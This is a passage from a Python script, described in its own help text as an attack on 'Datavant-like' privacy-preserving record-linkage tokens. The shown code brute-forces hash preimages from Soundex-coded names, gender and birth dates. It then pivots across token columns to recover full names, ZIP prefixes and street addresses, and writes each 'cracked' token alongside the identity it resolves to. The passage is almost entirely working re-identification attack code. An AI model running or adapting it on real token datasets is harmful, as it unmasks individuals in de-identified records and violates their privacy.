        t7_hits_pure = {} # Will store {mt: ((t7_preimage), (t2_preimage))}
        t7_time = None
        if "T7" in dec:
            print("[*] (PURE) Attacking T7 using T2 preimages...")
            start = time.time()
            for _mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                # Use the new "pure" function
                out = attack_T7_via_T2_pure(dec["T7"], sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher)
                t7_hits_pure.update(out)
            t7_time = time.time() - start
            # Extract T7 hits for reporting
            t7_hits = {mt: preimages[0] for mt, preimages in t7_hits_pure.items()}
            print(f"     -> Found {len(t7_hits)} T7 preimages")
            print(f"[Timer] T7: {t7_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t7_hits_pure:
            print("[*] (PURE) Pivoting to T4 using T7 and T2 context...")
            start = time.time()
            for _mt7, (t7_preimage, t2_preimage) in t7_hits_pure.items():
                (ln_b, fi3_b, g_b, dob_b) = t7_preimage
                (sdx_ln_b, sdx_fn_b, _, _) = t2_preimage
                
                # Call the correct pivot function
                out = pivot_to_T4_via_T7_T2(dec["T4"], sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                t4_pivot_hits.update(out)
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")
    
    # =============================
    # PURE BRUTEFORCE: T2 -> T1 -> T4 --> T3 -> T9
    # =============================

    elif args.columns == "T2,T1,T4,T3,T9" and args.bruteforce == True:
        t2_hits = {}
        t2_time = None
        if "T2" in dec:
            print("[*] Attacking T2 (sdx(ln)|sdx(fn)|g|dob) with FULL SOUNDEX BRUTE-FORCE...")
            start = time.time()
            t2_hits = attack_T2_fast(dec["T2"], list(ALL_SDX_LN), list(ALL_SDX_FN), DOBS_B, init_hasher)
            t2_time = time.time() - start
            print(f"     -> Found {len(t2_hits)} T2 preimages")
            print(f"[Timer] T2: {t2_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t1_hits_pure = {} # Will store {mt: ((t1_preimage), (t2_preimage))}
        t1_time = None
        if "T1" in dec:
            print("[*] (PURE) Attacking T1 using T2 preimages...")
            start = time.time()
            for _mt2, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                # Use the new "pure" function
                out = attack_T1_via_T2_pure(dec["T1"], sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
                t1_hits_pure.update(out)
            t1_time = time.time() - start
            # Extract T1 hits for reporting
            t1_hits = {mt: preimages[0] for mt, preimages in t1_hits_pure.items()}
            print(f"     -> Found {len(t1_hits)} T1 preimages")
            print(f"[Timer] T1: {t1_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

        t4_pivot_hits = {}
        t4_time = None
        if "T4" in dec and t1_hits_pure:
            print("[*] (PURE) Pivoting to T4 using T1 and T2 context...")
            start = time.time()
            for _mt1, (t1_preimage, t2_preimage) in t1_hits_pure.items():
                
                # ***** THIS IS THE FIX *****
                # Call the new pure pivot function instead of pivot_to_T4_fast
                out = pivot_to_T4_via_T1_T2_pure(dec["T4"], t1_preimage, t2_preimage, init_hasher)
                t4_pivot_hits.update(out)
                
            t4_time = time.time() - start
            print(f"     -> Resolved {len(t4_pivot_hits)} T4 preimages via pivot")
            print(f"[Timer] T4: {t4_time:.2f} seconds")
            print(f"[HASHES] Total hash computations so far: {HASHES}")

    # Final Pivots (Common to both modes if T4 was found)
    if "T3" in dec and t4_pivot_hits:
        print("[*] Pivoting to T3 via T4..."); start = time.time()
        for _, t4_preimage in t4_pivot_hits.items():
            out = pivot_to_T3_fast(dec["T3"], t4_preimage[0], t4_preimage[1], t4_preimage[3], init_hasher) 
            t3_pivot_hits.update(out)
        t3_time = time.time() - start
        print(f"    -> Found {len(t3_pivot_hits)} T3 ({t3_time:.2f}s). Hashes: {HASHES}")

    if "T9" in dec and t3_pivot_hits:
        print("[*] Pivoting to T9 via T3..."); start = time.time()
        for _, t3_preimage in t3_pivot_hits.items():
            out = pivot_to_T9_fast(dec["T9"], t3_preimage[1], init_hasher)
            t9_pivot_hits.update(out)
        t9_time = time.time() - start
        print(f"    -> Found {len(t9_pivot_hits)} T9 ({t9_time:.2f}s). Hashes: {HASHES}")

    # =============================
    # Print results
    # =============================
    with open(args.outfile, "w", encoding="utf-8") as f:
        if t1_hits:
            f.write(f"[T1] {len(t1_hits)} master tokens cracked\n")
            f.write(f"[TIMER] T1: {t1_time:.2f} seconds\n")
            for mt, (ln_b, fi_b, g_b, dob_b) in t1_hits.items():
                f.write(f"MT(hex)={mt.hex()}   ←   ln={ln_b.decode()} fi={fi_b.decode()} g={g_b.decode()} dob={dob_b.decode()}\n")

        if t2_hits:
            f.write(f"[T2] {len(t2_hits)} master tokens cracked\n")
            f.write(f"[TIMER] T2: {t2_time:.2f} seconds\n")
            for mt, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                f.write(f"MT(hex)={mt.hex()}   ←   sdx_ln={sdx_ln_b.decode()} sdx_fn={sdx_fn_b.decode()} g={g_b.decode()} dob={dob_b.decode()}\n")

        if t7_hits:
            f.write(f"[T7] {len(t7_hits)} master tokens cracked (pivot)\n")
            f.write(f"[TIMER] T7: {t7_time:.2f} seconds\n")
            for mt, (ln_b, fi3_b, g_b, dob_b) in t7_hits.items():
                f.write(f"MT(hex)={mt.hex()}   ←   ln={ln_b.decode()} fi3={fi3_b.decode()} g={g_b.decode()} dob={dob_b.decode()}\n")

        if t4_pivot_hits:
            f.write(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)\n")
            f.write(f"[TIMER] T4: {t4_time:.2f} seconds\n")
            for mt, (ln_b, fn_b, g_b, dob_b) in t4_pivot_hits.items():
                f.write(f"MT(hex)={mt.hex()}   ←   ln={ln_b.decode()} fn={fn_b.decode()} g={g_b.decode()} dob={dob_b.decode()}\n")

        if t3_pivot_hits:
            f.write(f"[T3] {len(t3_pivot_hits)} master tokens cracked (pivot)\n")
            f.write(f"[TIMER] T3: {t3_time:.2f} seconds\n")
            for mt, (ln_b, fn_b, dob_b, zip3_b) in t3_pivot_hits.items():
                f.write(f"MT(hex)={mt.hex()}   ←   ln={ln_b.decode()} fn={fn_b.decode()} dob={dob_b.decode()} zip3={zip3_b.decode()}\n")
                
        if t9_pivot_hits:
            f.write(f"[T9] {len(t9_pivot_hits)} master tokens cracked (pivot)\n")
            f.write(f"[TIMER] T9: {t9_time:.2f} seconds\n")
            for mt, (fn_b, addr_b) in t9_pivot_hits.items():
                f.write(f"MT(hex)={mt.hex()}   ←   fn={fn_b.decode()} address={addr_b.decode()}\n")

def main():
    ap = argparse.ArgumentParser(description="Attack Datavant-like tokens: decrypt site tokens, crack low-entropy keys, pivot to higher-entropy.")
    ap.add_argument("--in", dest="infile", required=True, help="CSV with token columns (e.g., T1,T2,T4)")
    ap.add_argument("--out", dest="outfile", required=True, help="Output file for results")
    ap.add_argument("--columns", required=True, help="Comma-separated token column names to use (e.g., T1,T2,T4)")
    ap.add_argument("--dist-file", default="", dest="dist_file", help="(Optional) Distribution CSV providing first_name,last_name,address columns (replaces hardcoded ohio_cleaned.csv)")
    ap.add_argument("--top-n", dest="top_n", type=int, default=500, help="How many top frequent values to take for names/addresses (default: 500)")
    ap.add_argument("--site-key", required=True, help="AES-256 key (hex or utf-8) for site token decryption")
    ap.add_argument("--lang", choices=["de", "us"], default="de", help="Language for hardcoded dictionaries if --dist-file is not used (default: de)")
    ap.add_argument("--master-salt", default="", help="(Optional) master salt (hex or utf-8); if empty uses SHA-256(no salt)")
    ap.add_argument("--bruteforce", action="store_true", help="(Optional) Use PURE brute-force methods (slower but more thorough)")
    args = ap.parse_args()
    run_attack(args)

if __name__ == "__main__":
    main()